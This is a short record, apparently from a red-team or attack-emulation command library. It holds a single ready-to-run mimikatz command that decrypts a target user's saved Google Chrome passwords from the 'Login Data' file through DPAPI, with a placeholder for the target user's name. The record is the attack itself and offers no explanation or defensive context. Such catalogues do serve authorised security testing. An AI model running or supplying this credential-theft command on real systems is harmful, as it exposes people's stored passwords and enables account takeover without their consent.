---
id: ae14bc4f-2857-4d5d-9990-2374dd222ecd
name: cmd-ae14bc4f
type: command
executor: bash
data: mimikatz.exe "dpapi::chrome /in:"""C:\Users\$_TARGET_USER\AppData\Local\Google\Chrome\User
  Data\Default\Login Data""" /unprotect"
output: ''
created_at: '2023-03-13T19:52:35.078857+00:00'
updated_at: '2023-03-14T01:11:04.243252+00:00'
---

# Command ae14bc4f

```bash
mimikatz.exe "dpapi::chrome /in:"""C:\Users\$_TARGET_USER\AppData\Local\Google\Chrome\User Data\Default\Login Data""" /unprotect"
```


